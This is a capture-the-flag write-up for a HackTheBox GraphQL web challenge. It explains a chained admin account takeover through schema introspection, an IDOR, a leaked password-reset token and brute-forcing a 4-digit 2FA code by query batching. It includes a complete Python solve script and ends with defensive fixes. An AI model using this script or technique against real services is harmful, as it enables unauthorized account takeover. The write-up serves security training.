## Overview

`SpeedNet` is an Easy HackTheBox **Web** challenge: a React single-page app for a
fictional ISP that talks to a single [GraphQL](https://cwe.mitre.org/data/definitions/285.html)
endpoint. The whole solve is a chained account takeover of the admin account
(`userId: 1`), ending with the flag hidden in the admin's invoice history. Four
missing checks stack up — introspection left on, no object-level authorization, a
debug endpoint shipped to production, and no rate limit on a 4-digit one-time code.

## The technique

The app exposes `POST /graphql`. The React bundle only ever calls nine operations,
but **introspection is enabled**, so the server hands over the full schema — including
a tenth mutation the UI never uses: `devForgotPassword(email)`. Diffing the
introspected schema against the operations in the JavaScript bundle is what surfaces
that hidden, leftover developer endpoint.

From there the chain is:

1. **[Broken object-level authorization](https://cwe.mitre.org/data/definitions/285.html) (IDOR).**
   `userProfile(userId: Int)` returns any user by id with no ownership check.
   `userProfile(userId: 1)` leaks the admin (`admin@speednet.htb`, 2FA enabled).
2. **Debug endpoint leaks the reset token.** `devForgotPassword(admin@speednet.htb)`
   returns the plaintext reset token right in its response message — no email round
   trip. Feed it to `resetPassword(token, newPassword)` and you own the admin password.
3. **[2FA bypass via GraphQL batching](https://cwe.mitre.org/data/definitions/400.html).**
   Logging in now returns `2FA_REQUIRED:<pending-uuid>` in the error message. The OTP
   is only four digits and `verifyTwoFactor` has no attempt limit, so GraphQL query
   batching — an array of operations in a single HTTP request — tries all 10,000 codes
   in about twenty requests; the pending token is not invalidated between guesses.

## Solution

One important quirk first: the app sends the **raw JWT** in the `Authorization`
header with no `Bearer ` prefix (the SPA does `Authorization: localStorage.getItem("token")`).
Sending `Bearer <jwt>` returns "Not authenticated".

The full chain is scripted in `solve.py`:

```python
import json, urllib.request, urllib.error, re

URL = "http://TARGET/graphql"

def gql(query=None, variables=None, token=None, raw=None):
    data = (raw if raw is not None else json.dumps({"query": query, "variables": variables or {}})).encode()
    h = {"Content-Type": "application/json"}
    if token:
        h["Authorization"] = token            # raw JWT, NOT "Bearer <jwt>"
    req = urllib.request.Request(URL, data=data, headers=h)
    try:
        return json.loads(urllib.request.urlopen(req, timeout=20).read())
    except urllib.error.HTTPError as e:
        return json.loads(e.read())

# 1) register a throwaway account -> raw session token
u = "guest01"
reg = gql("mutation($i:RegisterInput!){register(input:$i){token user{id}}}",
          {"i": {"email": u+"@x.htb", "firstName": "a", "lastName": "b",
                 "username": u, "password": "Guest!123", "address": "x", "phoneNumber": "1"}})
tok = reg["data"]["register"]["token"]

# 2) IDOR: userId 1 is the admin
admin = gql("{userProfile(userId:1){email twoFactorAuthEnabled}}", token=tok)
admin_email = admin["data"]["userProfile"]["email"]

# 3) hidden dev mutation returns the reset token in its message
dev = gql("mutation($e:String!){devForgotPassword(email:$e)}", {"e": admin_email})
reset_token = re.search(r"[0-9a-f-]{36}", dev["data"]["devForgotPassword"]).group(0)

# 4) reset the admin password
NEWPW = "Pwn3d!Admin123"
gql("mutation($t:String!,$p:String!){resetPassword(token:$t,newPassword:$p)}",
    {"t": reset_token, "p": NEWPW})

# 5) login -> the pending 2FA token is inside the error message
lg = gql("mutation($e:String!,$p:String!){login(email:$e,password:$p){token}}",
         {"e": admin_email, "p": NEWPW})
pend = re.search(r"2FA_REQUIRED:([0-9a-fA-F-]{36})", lg["errors"][0]["message"]).group(1)

# 6) batch-brute the 4-digit OTP: an ARRAY of verifyTwoFactor ops per request
MUT = "mutation V($t:String!,$o:String!){verifyTwoFactor(token:$t,otp:$o){token}}"
codes = ["%04d" % n for n in range(10000)]
session = None
for i in range(0, len(codes), 500):
    batch = [{"query": MUT, "variables": {"t": pend, "o": c}} for c in codes[i:i+500]]
    for r in gql(raw=json.dumps(batch), token=pend):
        d = (r.get("data") or {}).get("verifyTwoFactor")
        if d and d.get("token"):
            session = d["token"]; break
    if session:
        break

# 7) flag is hidden in the admin's invoice history (an invoice "number" field)
print(gql("{invoiceHistory(limit:50){id number amount status}}", token=session))
```

Running it against the live instance walks the chain end to end and prints the admin's
invoice history — one of the invoice `number` fields is the flag, `HTB{...}`.

## Why it worked

Every step is a check that should have been there and was not: introspection exposed
hidden attack surface, `userProfile` had no per-object authorization, a debug mutation
that returns a [password-reset token](https://cwe.mitre.org/data/definitions/640.html)
was shipped to production, and a four-digit OTP with no rate limit collapses to a
handful of requests once GraphQL batching lets many guesses ride in one request.

## Fix / defense

- Disable GraphQL introspection in production and never ship debug mutations
  (`devForgotPassword`) to production builds.
- Enforce object-level authorization inside every resolver — a user may only fetch its
  own id from `userProfile`.
- Never return reset tokens in API responses; deliver them out of band only.
- Rate-limit `verifyTwoFactor`, invalidate the pending token after a few failures, and
  cap or reject GraphQL batch sizes. Use a longer, short-lived OTP.
